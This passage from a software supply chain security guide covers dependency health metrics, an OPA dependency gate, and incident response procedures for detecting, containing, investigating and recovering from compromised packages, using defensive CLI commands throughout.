- At least 50% test statement coverage
- Memory-safety language or hardened memory-safe functions
- Warning flags enabled in builds
- All changes reviewed by another contributor
- Dynamic analysis (fuzzing) used for testing
- Static analysis integrated into CI

**Gold**: Comprehensive security posture
- At least 80% test statement coverage
- All cryptographic algorithms come from standard libraries
- CI runs the full test suite on all platforms
- Hardened security settings (strong TLS, HSTS, CSP)
- Automated static analysis passing with no warnings

### deps.dev Health Metrics

Google's deps.dev provides health signals for open source packages:

```bash
# API queries
curl "https://api.deps.dev/v3alpha/systems/npm/packages/lodash/versions/4.17.21" | jq '{
  publishedAt: .publishedAt,
  isDefault: .isDefault,
  dependentCount: .dependentCount,
  licenses: .licenses
}'

# Check for advisories
curl "https://api.deps.dev/v3alpha/systems/npm/packages/lodash/versions/4.17.20/advisories"

# Get latest version info
curl "https://api.deps.dev/v3alpha/systems/pypi/packages/requests" | jq '.versions[-1]'
```

Key health signals:
- **Latest version**: Is the pinned version current or significantly behind?
- **License**: SPDX license expression; any GPL contamination?
- **Advisories**: Known vulnerabilities in this version
- **Dependents count**: How many packages depend on this? (criticality indicator)
- **Published date**: How recently was this version released?
- **Verified**: Does it match the source repository?

### CHAOSS Project Metrics

CHAOSS (Community Health Analytics in Open Source Software) defines metrics for evaluating open source community health:

**Contributor Metrics:**
```
Bus Factor = number of contributors accounting for 50% of commits
(Lower is riskier: Bus Factor 1 means one person could leave and cripple the project)

Contributor Count = unique contributors in last 90 days
Response Time to Issues = median time from issue creation to first response
PR Cycle Time = median time from PR creation to merge
```

**Activity Metrics:**
- Release Cadence: Frequency of releases (should match project needs)
- Issue Closure Rate: Issues closed vs opened in time period
- Code Change Frequency: Commits per week/month

**Risk Metrics:**
- Elephant Factor: % of commits from top-1 organization (>50% indicates organizational dependency risk)
- Organizational Diversity: Number of organizations contributing
- Technical Fork Count: How many active forks exist

### OpenSSF Alpha-Omega Project

Alpha-Omega funds security work for critical open source projects:

**Alpha**: Targets the most critical projects with dedicated security engineers
- Projects: curl (Daniel Stenberg), Node.js, Python, Rust, OpenSSL, Linux kernel
- Provides funding for security audits, vulnerability remediation, security tooling
- Deliverables: threat model, security audit, CVE remediation

**Omega**: Automated security analysis across top 10,000 open source projects
- Automated scanning with CodeQL, Semgrep, OSV Scanner
- Human review of highest-confidence findings
- Patch submission to upstream projects

### OPA Policy for Dependency Gate in CI

```rego
# policy/dependency_gate.rego
package dependency_gate

import future.keywords.if
import future.keywords.in

# Deny if Scorecard score below threshold
deny[msg] if {
    package := input.packages[_]
    scorecard_score := scorecard_scores[package.name]
    scorecard_score < 5.0
    msg := sprintf("Package '%s' has Scorecard score %.1f (minimum: 5.0)",
                   [package.name, scorecard_score])
}

# Deny if known vulnerability with CVSS >= 7.0
deny[msg] if {
    package := input.packages[_]
    vuln := package.vulnerabilities[_]
    vuln.cvss >= 7.0
    msg := sprintf("Package '%s@%s' has critical vulnerability %s (CVSS: %.1f)",
                   [package.name, package.version, vuln.id, vuln.cvss])
}

# Deny if license is incompatible
deny[msg] if {
    package := input.packages[_]
    package.license in prohibited_licenses
    msg := sprintf("Package '%s' has prohibited license: %s",
                   [package.name, package.license])
}

prohibited_licenses := {"GPL-2.0", "GPL-3.0", "AGPL-3.0", "SSPL-1.0"}

# Warn if package is unmaintained (no commits in 2+ years)
warn[msg] if {
    package := input.packages[_]
    package.last_commit_days_ago > 730
    msg := sprintf("Package '%s' appears unmaintained (last commit: %d days ago)",
                   [package.name, package.last_commit_days_ago])
}
```

```yaml
# CI integration
- name: Evaluate dependency policy
  run: |
    # Collect package metadata
    python collect_dependency_metadata.py > packages.json

    # Evaluate against OPA policy
    opa eval --data policy/dependency_gate.rego              --input packages.json              --format pretty              "data.dependency_gate.deny" > violations.json

    # Fail if any violations
    violations=$(jq 'length' violations.json)
    if [ "$violations" -gt 0 ]; then
      cat violations.json
      exit 1
    fi
```


## 10. Supply Chain Incident Response

### Detection Signals

Early detection is critical for limiting the blast radius of supply chain compromises. Key signals to monitor:

#### Dependency Changes
```bash
# Alert on unexpected new dependencies in lockfile
git diff HEAD~1 -- package-lock.json | grep '^\+' | grep '"resolved"'
git diff HEAD~1 -- requirements.txt Pipfile.lock

# CI gate: flag any dependency additions for security review
# .github/workflows/dependency-review.yml
- uses: actions/dependency-review-action@4081bf99e2866ebe428fc0477b69eb4fcda7220a
  with:
    fail-on-severity: high
    deny-licenses: GPL-2.0, AGPL-3.0

# Monitor for dependency confusion indicators
# New package with same name as private package appearing in public registry
```

#### Artifact Integrity Anomalies
```bash
# Hash verification at deploy time
EXPECTED_HASH="sha256:abc123..."
ACTUAL_HASH=$(sha256sum ./myapp-linux-amd64 | cut -d' ' -f1)
if [ "$EXPECTED_HASH" != "sha256:$ACTUAL_HASH" ]; then
  echo "ALERT: Artifact hash mismatch - potential tampering detected"
  exit 1
fi

# Compare artifact hashes against Rekor entries
rekor-cli get --log-index 12345678 --format json |   jq '.body | @base64d | fromjson | .spec.data.hash'
```

#### Build Environment Anomalies
```bash
# Monitor for unexpected process spawning in build environment
# Falco rule for build pipeline
- rule: Unexpected Process in Build Container
  condition: spawned_process and container.label.purpose="build" and
    not proc.name in (allowed_build_processes)
  output: "Unexpected process in build: %proc.cmdline"

# Network egress during hermetic build phase
# Any outbound connection during hermetic build is a red flag
```

#### Sigstore Transparency Log Monitoring
```bash
# Monitor Rekor for unexpected signatures on your packages
# Subscribe to Rekor webhook for your organization's identities

# Check if artifact was signed by unexpected identity
cosign verify   --certificate-identity "https://github.com/myorg/myrepo/*"   --certificate-oidc-issuer https://token.actions.githubusercontent.com   ghcr.io/myorg/myimage:tag 2>&1 | grep -i "unexpected\|error\|mismatch"
```

### Containment Procedures

#### Package Version Removal

**npm:**
```bash
# Unpublish specific version (within 72 hours)
npm unpublish package-name@1.2.3

# Force unpublish (after 72 hours, requires npm support)
npm unpublish package-name --force
# Note: npm policy limits unpublish after 72 hours; contact support@npmjs.com

# Deprecate with warning message
npm deprecate package-name@1.2.3 "SECURITY: This version contains a backdoor. Use 1.2.4+"
```

**PyPI:**
```bash
# Submit removal request to PyPI admins
# Email: admin@pypi.org or file issue at https://github.com/pypa/warehouse
# Include: package name, version(s), evidence of malicious behavior

# For immediate response, use PyPI's emergency contact process
# PyPI does not provide self-service delete for published packages
# This is by design to prevent supply chain attacks via package deletion

# Yank a specific version (prevents new installs, won't break existing)
# Via PyPI web interface: Manage > Release > Yank this release
```

**Maven Central:**
```bash
# Maven Central does not support deletion of published artifacts
# This is a deliberate policy (reproducible builds depend on immutability)
# Contact: https://central.sonatype.org/publish/delete/
# For security emergencies: central@sonatype.com

# Mitigation: publish a new version with fix and communicate urgently
# Add metadata warning to affected POM files
```

#### Emergency Network Containment
```bash
# Block egress to compromised package registry domain
# iptables (Linux)
iptables -A OUTPUT -d malicious-registry.example.com -j DROP

# AWS Security Group (block specific IP range)
aws ec2 revoke-security-group-egress   --group-id sg-123456   --protocol tcp   --port 443   --cidr 1.2.3.4/32

# Kubernetes NetworkPolicy to block egress
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-compromised-registry
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 1.2.3.4/32  # Compromised registry IP
EOF
```

### Forensic Analysis

#### Build Log Verification
```bash
# Download build logs from CI system
gh run download <run-id> --name logs

# Check artifact hashes in build logs against released artifacts
grep "SHA256\|sha256\|hash" build.log | sort > build-hashes.txt
sha256sum ./dist/* > release-hashes.txt
diff build-hashes.txt release-hashes.txt  # Should be empty

# Verify SLSA provenance against release artifacts
slsa-verifier verify-artifact ./myapp-linux-amd64   --provenance-path myapp.intoto.jsonl   --source-uri github.com/myorg/myrepo
```

#### SBOM Comparison (Before/After Incident)
```bash
# Compare SBOM snapshots to identify introduced components
# Using CycloneDX CLI
cyclonedx-cli diff   --from-file sbom-before-incident.json   --to-file sbom-after-incident.json   --component-versions

# Using diffoscope for deep comparison
diffoscope sbom-before.spdx.json sbom-after.spdx.json

# Identify new packages introduced during incident window
python3 - <<'EOF'
import json
before = json.load(open('sbom-before.json'))
after = json.load(open('sbom-after.json'))

before_pkgs = {c['name']+c['version'] for c in before['components']}
after_pkgs = {c['name']+c['version'] for c in after['components']}

new_packages = after_pkgs - before_pkgs
removed_packages = before_pkgs - after_pkgs

print("NEW packages (potential backdoors):", new_packages)
print("REMOVED packages:", removed_packages)
EOF
```

#### Timeline Reconstruction
```bash
# Git blame to find when dependency was introduced
git log --all --follow -p -- package.json | grep -A2 -B2 "malicious-package"
git log --oneline --since="2024-01-01" --until="2024-02-01" -- requirements.txt

# Find who approved the PR that introduced the dependency
gh pr list --search "malicious-package in:body" --json number,author,mergedAt
gh pr view <PR_NUMBER> --json reviews,reviewers,mergedAt,author
```

### Downstream Notification

#### PSIRT Process

Product Security Incident Response Team (PSIRT) workflow for supply chain incidents:

1. **Triage** (0-4 hours): Confirm incident, assess scope, convene response team
2. **Contain** (0-24 hours): Isolate affected systems, block malicious infrastructure
3. **Notify internal** (0-24 hours): Alert engineering, legal, communications teams
4. **Assess impact** (24-72 hours): Determine which customers/products are affected
5. **Draft advisory** (24-72 hours): Prepare GitHub Security Advisory and VEX document
6. **Notify affected customers** (72 hours): Direct notification to affected accounts
7. **Public disclosure**: Coordinate with affected parties on timing

#### GitHub Security Advisory
```bash
# Create draft security advisory
gh api repos/owner/repo/security-advisories   --method POST   --field summary="Supply chain compromise via malicious dependency"   --field description="..."   --field severity="critical"   --field cve_id="CVE-2024-XXXXX"

# Publish advisory (triggers CVE request if no CVE yet)
gh api repos/owner/repo/security-advisories/GHSA-xxxx-xxxx-xxxx   --method PATCH   --field state="published"
```

#### VEX Document Publishing

VEX (Vulnerability Exploitability eXchange) communicates exploitability status for known vulnerabilities in your products:

```json
{
  "@context": "https://openvex.dev/ns/v0.2.0",
  "@id": "https://example.com/vex/2024-supply-chain-001",
  "author": "Example Corp PSIRT <security@example.com>",
  "timestamp": "2024-02-15T10:00:00Z",
  "version": "1",
  "statements": [
    {
      "vulnerability": {"@id": "https://osv.dev/vulnerability/GHSA-xxxx-xxxx-xxxx"},
      "products": [
        {"@id": "pkg:docker/example/product-a@1.0.0", "status": "affected"},
        {"@id": "pkg:docker/example/product-b@2.1.0", "status": "not_affected",
         "justification": "component_not_present"},
        {"@id": "pkg:docker/example/product-a@1.0.1", "status": "fixed",
         "action_statement": "Update to version 1.0.1 which removes the compromised dependency"}
      ]
    }
  ]
}
```

### Recovery Procedures

#### Rebuild from Clean Environment
```bash
# 1. Provision fresh build environment (no cached state)
# Use ephemeral runners or new EC2 instance from known-good AMI

# 2. Clone source from verified commit
git clone --depth=1   --branch v1.2.4   https://github.com/myorg/myrepo.git

# 3. Verify source integrity
git verify-tag v1.2.4
git verify-commit HEAD

# 4. Clear all package caches
npm cache clean --force
pip cache purge

# 5. Install from pinned lockfile with integrity verification
npm ci  # Installs exactly from package-lock.json with hash verification
pip install --require-hashes -r requirements.txt
```

#### Rotate All CI/CD Secrets
```bash
# Assume ALL CI/CD secrets are compromised
# Rotate in order of criticality:

# 1. Cloud provider credentials
aws iam create-access-key --user-name ci-deploy-user
aws iam delete-access-key --access-key-id OLD_KEY_ID

# 2. Package registry tokens
npm token revoke <token-id>
npm token create --read-only=false

# 3. GitHub tokens and deploy keys
gh auth token  # Get current token
# Revoke via GitHub Settings > Developer Settings > Personal Access Tokens

# 4. Container registry credentials
# Rotate robot accounts, OIDC configurations

# 5. Signing keys
# If compromised: revoke GPG key, rotate cosign key material
# Publish key revocation to key servers
gpg --keyserver hkps://keyserver.ubuntu.com --send-keys KEY_ID  # After revocation
```

#### Re-sign and Redeploy Artifacts
```bash
# After clean rebuild, re-sign all affected artifacts
cosign sign --yes   ghcr.io/myorg/myimage@sha256:<new-clean-build-digest>

# Update SBOM with clean build artifacts
syft packages image:ghcr.io/myorg/myimage:latest -o cyclonedx-json > new-sbom.json
cosign attach sbom --sbom new-sbom.json   ghcr.io/myorg/myimage@sha256:<new-clean-build-digest>
```

### SSDF Practice Mapping (NIST SP 800-218)

The Secure Software Development Framework (SSDF) maps supply chain practices to requirements:

**PW.4 — Reuse Existing Well-Secured Software**: Use vetted, well-maintained libraries instead of custom implementations. Evaluate dependencies using Scorecard, deps.dev health metrics, and license compliance before adoption. Maintain an approved dependency allowlist.

**PW.7 — Review Code for Security Vulnerabilities**: All code changes including dependency updates should be reviewed. Use automated SAST (CodeQL, Semgrep), SCA (OWASP Dependency Check, Snyk), and human review. Document security review outcomes.

**RV.1 — Identify and Confirm Vulnerabilities**: Continuously monitor for new vulnerabilities via OSV, GitHub Security Advisories, and NVD. Automated scanning in CI (govulncheck, pip-audit, npm audit). Subscribe to security mailing lists for critical dependencies.

**RV.2 — Assess Vulnerabilities**: For each identified vulnerability, assess exploitability in your specific context (reachability analysis), impact (CVSS, EPSS scores), and remediation options (patch, workaround, compensating controls). Document risk acceptance decisions.

**RV.3 — Analyze Vulnerabilities to Create Fixes**: Develop patches or implement workarounds. Test fixes in staging. Create regression tests. Update SBOM and VEX documents. Publish security advisory coordinated with upstream maintainers.

```
SSDF Practice     | Supply Chain Control
PW.4.1            | Dependency allowlist, Scorecard thresholds
PW.4.2            | Artifact signing verification (cosign verify)
PW.7.1            | Automated SCA in CI (OWASP DC, Snyk, Dependabot)
PW.7.2            | Human review of dependency PRs
RV.1.1            | osv-scanner, GitHub Security Advisories subscription
RV.1.2            | SBOM-based vulnerability correlation
RV.2.1            | CVSS + EPSS scoring, reachability analysis
RV.2.2            | Risk acceptance with documented business justification
RV.3.1            | Patch development, upstream coordination, CVE request
RV.3.2            | VEX document publication, customer notification
```
